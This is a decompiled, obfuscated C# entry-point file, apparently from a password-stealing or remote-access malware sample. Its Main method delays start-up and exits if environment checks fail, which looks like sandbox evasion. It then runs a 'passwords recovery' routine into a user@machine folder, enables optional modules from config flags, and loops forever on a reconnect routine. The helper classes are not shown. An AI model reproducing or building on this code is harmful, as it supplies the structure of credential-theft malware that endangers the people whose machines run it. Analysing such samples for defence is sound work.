using System;
using System.IO;
using System.Net;
using System.Threading;
using ns13;
using ns14;
using ns19;
using ns20;
using ns22;

namespace ns1;

public class GClass9
{
	private static string string_0 = Path.Combine(Class55.smethod_0(), Class6.string_0 + "@" + Class6.string_1 + "_" + Class6.string_2);

	public static void Main()
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		for (int i = 0; i < Convert.ToInt32(GClass10.string_16); i++)
		{
			Thread.Sleep(1000);
		}
		if (!GClass10.smethod_0())
		{
			Environment.Exit(0);
		}
		try
		{
			GClass11.smethod_11(smethod_0());
			if (!GClass23.smethod_0())
			{
				Environment.Exit(0);
			}
			if (Convert.ToBoolean(GClass10.string_12))
			{
				Class89.smethod_0();
			}
			if (Convert.ToBoolean(GClass10.string_5))
			{
				Class88.smethod_0();
			}
			if (Convert.ToBoolean(GClass10.string_14) && GClass22.smethod_0())
			{
				GClass25.smethod_1();
			}
			GClass22.smethod_4();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				if (!GClass28.Boolean_0)
				{
					GClass28.smethod_3();
					GClass28.smethod_0();
				}
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	public static string smethod_0()
	{
		Console.WriteLine("Running passwords recovery...");
		if (!Directory.Exists(string_0))
		{
			Directory.CreateDirectory(string_0);
		}
		else
		{
			try
			{
				Class62.smethod_0(string_0);
			}
			catch
			{
				Console.WriteLine("Failed recursive remove directory");
			}
		}
		if (Class56.smethod_0(string_0))
		{
			return string_0;
		}
		return "";
	}
}
